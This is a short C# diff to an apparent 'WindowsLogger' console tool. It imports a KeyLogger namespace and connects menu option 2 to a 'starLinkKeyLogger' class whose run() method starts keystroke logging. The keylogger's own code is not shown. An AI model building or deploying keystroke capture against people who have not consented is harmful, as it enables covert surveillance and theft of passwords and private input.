@@ -9,6 +9,7 @@ using System.Diagnostics;
 using WindowsLogger;
 using System.Threading;
 using WindowsLogger.EventLogger;
+using WindowsLogger.KeyLogger;
 
 namespace WindowsLogger
 {
@@ -39,7 +40,8 @@ namespace WindowsLogger
                 }
                 else if(option == "2")
                 {
-                    Console.WriteLine("Not Implemented");
+                     starLinkKeyLogger logger = new starLinkKeyLogger();
+                     logger.run();
                 }
                 else
                 {
